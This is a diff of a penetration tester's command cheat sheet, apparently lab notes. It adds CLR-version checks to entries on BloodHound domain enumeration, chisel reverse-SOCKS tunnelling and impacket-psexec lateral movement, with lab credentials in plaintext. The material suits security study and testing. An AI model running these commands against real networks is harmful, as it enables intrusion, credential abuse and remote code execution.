@@ -107,7 +107,14 @@ bloodhound with ldap (non-domain-joined) (make sure dns can find domain fqdn)
 ```
 invoke-bloodhound -collectionmethod all -domain "final.com" -LDAPUser "jack" -LDAPPass "P@ssw0rd"
 ```
-chisel socks (win)
+check clr version
+```
+$psversiontable.clrversion
+```
+```
+[system.environment]::version
+```
+chisel socks win
 ```
 /opt/chisel/chisel server -p 8000 --reverse
 ```
@@ -125,7 +132,7 @@ socks5 127.0.0.1 8001
 ```
 proxychains -q -f chi.conf impacket-psexec TRICKY/sqlsvc:'4dfgdfFFF542'@sql07.corpy.com 
 ```
-chisel socks (lin)
+chisel socks lin
 ```
 /opt/chisel/chisel server -p 8000 --reverse
 ```
